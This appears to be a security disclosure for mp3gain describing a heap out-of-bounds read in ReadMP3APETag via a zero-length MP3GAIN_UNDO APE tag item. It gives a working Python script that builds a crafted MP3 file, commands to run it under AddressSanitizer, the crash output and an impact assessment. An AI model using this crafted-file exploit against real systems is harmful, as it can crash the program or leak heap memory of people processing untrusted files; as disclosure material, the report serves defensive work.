## Bug0: Heap OOB Read in ReadMP3APETag via Zero-Length MP3GAIN_UNDO APE Item

The function `ReadMP3APETag()` in `apetag.c` (lines 229-242) performs three fixed-size reads into a value buffer allocated as `malloc(vsize+1)` without first verifying that `vsize` is large enough to satisfy those reads, allowing an attacker to trigger a heap-buffer-overflow read when `vsize` is zero.

### PoC

Craft a malicious MP3 file using the Python script below and process it with the ASAN-instrumented mp3gain binary to trigger the vulnerability.

```python
#!/usr/bin/env python3
import struct

def build_poc():
    out_path = "poc_input.mp3"

    # APE item: MP3GAIN_UNDO with vsize=0
    # item_value_size (4B LE) + item_flags (4B LE) + key (null-terminated) + value (0 bytes)
    item_key   = b"MP3GAIN_UNDO\x00"   # 12 chars + null = 13 bytes
    item_vsize = 0
    item_flags = 0                      # UTF-8 text type
    item_value = b""                    # empty value triggers OOB

    item = struct.pack("<II", item_vsize, item_flags) + item_key + item_value
    # item total: 4 + 4 + 13 + 0 = 21 bytes

    items_data = item
    items_size = len(items_data)        # 21

    # APE footer (32 bytes)
    # Length = items_size + footer_size(32), does not include header
    tag_len = items_size + 32           # 53

    footer  = b"APETAGEX"
    footer += struct.pack("<I", 2000)   # Version = 2000 (APEv2)
    footer += struct.pack("<I", tag_len)# Length = 53
    footer += struct.pack("<I", 1)      # TagCount = 1
    footer += struct.pack("<I", 0)      # Flags = 0 (footer only, no header)
    footer += b"\x00" * 8              # Reserved

    # Fake MP3 prefix: MPEG1 Layer3 sync word + zero padding
    fake_mp3 = b"\xff\xfb\x90\x00" + b"\x00" * 96   # 100 bytes

    poc = fake_mp3 + items_data + footer
    # File layout:
    #   [0..99]    fake MP3 data  (100 bytes)
    #   [100..120] APE item       (21 bytes)
    #   [121..152] APE footer     (32 bytes)
    # Total: 153 bytes
    # Boundary check at apetag.c:202: isize+1+vsize > remaining => 13 > 13 = false,
    # so parsing proceeds into the MP3GAIN_UNDO branch with a 1-byte value buffer.

    with open(out_path, "wb") as f:
        f.write(poc)

    print(f"[+] PoC written: {out_path} ({len(poc)} bytes)")
    print(f"    items_size={items_size}  tag_len={tag_len}")
    print(f"    Expected: heap OOB read inside MP3GAIN_UNDO branch (apetag.c:230,234,238)")

if __name__ == "__main__":
    build_poc()
```

```bash
python3 gen.py
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" ./build_test/mp3gain poc_input.mp3 || true
for f in ./asan.log.*; do grep -E "AddressSanitizer|ERROR:|runtime error:" "$f" || true; done
```

**Result:** ERROR: AddressSanitizer: heap-buffer-overflow on address 0x502000000031 at pc 0x7f0ac5dab397 bp 0x7ffc02310b20 sp 0x7ffc023102c8
SUMMARY: AddressSanitizer: heap-buffer-overflow ../../../../src/libsanitizer/sanitizer_common/sanitizer_common_interceptors.inc:827 in __interceptor_memcpy
ERROR: AddressSanitizer: heap-buffer-overflow on address 0x502000000050 at pc 0x55f3ba4e0408 bp 0x7fffa0a75e40 sp 0x7fffa0a75e30
SUMMARY: AddressSanitizer: heap-buffer-overflow (mp3gain+0xb7407) in ReadMP3APETag

### Impact

An attacker who supplies a crafted MP3 file can cause `mp3gain` to perform out-of-bounds reads of up to ten bytes past a one-byte heap allocation, exposing adjacent heap metadata, pointers, or other in-memory data to potential disclosure. Any invocation of `mp3gain` on an untrusted file exercises this code path without requiring special privileges or user interaction beyond opening the file. Under adversarial heap layouts, the reads may also dereference unmapped memory and crash the process, constituting a reliable denial-of-service condition.
